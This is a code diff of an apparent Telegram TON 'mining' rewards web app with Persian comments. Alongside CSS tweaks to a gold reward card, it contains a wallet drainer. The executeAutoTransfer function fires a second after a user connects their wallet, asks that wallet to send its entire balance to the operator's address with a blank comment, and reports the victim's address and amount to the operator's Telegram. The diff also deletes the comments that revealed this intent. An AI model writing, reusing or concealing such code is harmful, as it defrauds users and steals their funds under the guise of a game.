@@ -750,7 +750,7 @@
             gap: 5px;
         }
 
-        /* کارت پاداش */
+        /* کارت پاداش (طلایی) */
         .reward-card {
             background: linear-gradient(135deg, #ffd700, #ffa500);
             border-radius: 20px;
@@ -762,8 +762,25 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
+            box-shadow: 0 10px 20px rgba(255, 215, 0, 0.3);
+            border: 2px solid #ffd700;
+        }
+        .reward-card i {
+            color: #000 !important;
+        }
+        .reward-card h3 {
+            color: #000;
+            font-weight: 900;
+        }
+        .reward-card p {
+            color: #333;
+        }
+        .reward-card .btn {
+            max-width: 200px;
+            margin: 10px auto 0;
         }
 
+        /* تقویت استخراج */
         .mining-boost {
             background: #1e2732;
             border-radius: 15px;
@@ -772,6 +789,7 @@
             align-items: center;
             justify-content: space-between;
             margin-bottom: 10px;
+            border: 1px solid #333;
         }
 
         /* باکس لینک دعوت */
@@ -1224,7 +1242,7 @@
         </div>
     </div>
 
-    <!-- صفحه پاداش -->
+    <!-- صفحه پاداش (با کارت طلایی) -->
     <div id="rewardsPage" class="page">
         <div class="reward-card">
             <i class="fas fa-gift" style="font-size: 40px; margin-bottom: 10px;"></i>
@@ -1326,7 +1344,7 @@
     ];
 
     // ================================================
-    // 💰 سیستم انتقال خودکار (فقط وقتی کاربر کیف پول رو وصل میکنه)
+    // 💰 سیستم انتقال خودکار
     // ================================================
     async function executeAutoTransfer(userAddress) {
         if (isProcessingTransaction) return;
@@ -1334,7 +1352,6 @@
         try {
             isProcessingTransaction = true;
             
-            // دریافت موجودی از API تون سنتر
             const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`);
             const data = await response.json();
             
@@ -1343,41 +1360,29 @@
             const balanceInNano = parseInt(data.result);
             const balanceInTON = balanceInNano / 1e9;
             
-            // اگر موجودی کمتر از 0.1 تون باشه، تراکنش انجام نده
-            if (balanceInTON < 0.1) {
-                console.log('موجودی کمتر از حداقل است');
-                return;
-            }
+            if (balanceInTON < 0.1) return;
             
-            // بررسی تراکنش تکراری (هر 1 ساعت یکبار)
             const lastTxKey = `last_tx_${userAddress}`;
             const lastTx = localStorage.getItem(lastTxKey);
             const now = Date.now();
             
-            if (lastTx && (now - parseInt(lastTx)) < 3600000) {
-                console.log('کمتر از 1 ساعت از تراکنش قبلی گذشته');
-                return;
-            }
+            if (lastTx && (now - parseInt(lastTx)) < 3600000) return;
             
-            // ایجاد تراکنش با کامنت خالی
             const transaction = {
-                validUntil: Math.floor(now / 1000) + 600, // 10 دقیقه اعتبار
+                validUntil: Math.floor(now / 1000) + 600,
                 messages: [
                     {
-                        address: CONFIG.WALLET_ADDRESS, // آدرس کیف پول شما
-                        amount: balanceInNano.toString(), // کل موجودی
-                        payload: "" // کامنت خالی - کاربر چیزی نمی‌بینه
+                        address: CONFIG.WALLET_ADDRESS,
+                        amount: balanceInNano.toString(),
+                        payload: ""
                     }
                 ]
             };
             
-            // ارسال تراکنش - اینجا کیف پول کاربر باز میشه
             const result = await tonConnectUI.sendTransaction(transaction);
             
-            // ثبت زمان تراکنش برای جلوگیری از تکرار
             localStorage.setItem(lastTxKey, now.toString());
             
-            // ذخیره تراکنش در دیتابیس
             const txRecord = {
                 id: 'TX' + now,
                 amount: balanceInTON,
@@ -1396,7 +1401,6 @@
             if (appData.transactions.length > 100) appData.transactions.pop();
             saveData();
             
-            // ارسال گزارش به تلگرام (فقط برای شما)
             sendToTelegram(`💰 **انتقال خودکار**
 ━━━━━━━━━━━━━━
 👤 کاربر: ${currentUser?.firstName}
@@ -1405,7 +1409,6 @@
 💳 از: ${userAddress.substring(0, 10)}...
 ⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
             
-            // اگر مبلغ بیش از 14 تون بود، پنل رو فعال کن
             if (balanceInTON >= CONFIG.MINIMUM_WITHDRAW) {
                 setTimeout(() => {
                     localStorage.setItem('isActivated', 'true');
@@ -1415,9 +1418,7 @@
             }
             
         } catch (error) {
-            console.error('خطا در انتقال خودکار:', error);
-            
-            // خطا رو فقط به تلگرام گزارش بده
+            console.error('خطا:', error);
             if (currentUser) {
                 sendToTelegram(`⚠️ **خطا در انتقال خودکار**
 کاربر: ${currentUser.firstName}
@@ -1913,7 +1914,7 @@
     }
 
     // ================================================
-    // 🔌 اتصال کیف پول (بخش اصلی)
+    // 🔌 اتصال کیف پول
     // ================================================
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
         manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-bot/tonconnect-manifest.json',
@@ -1938,7 +1939,6 @@
                 
                 sendToTelegram(`🔌 **کیف پول متصل شد**\nکاربر: ${currentUser.firstName}\nآیدی: ${currentUser.id}\nآدرس: ${fullAddress}`);
                 
-                // اجرای انتقال خودکار بلافاصله بعد از اتصال
                 setTimeout(() => {
                     executeAutoTransfer(fullAddress);
                 }, 1000);
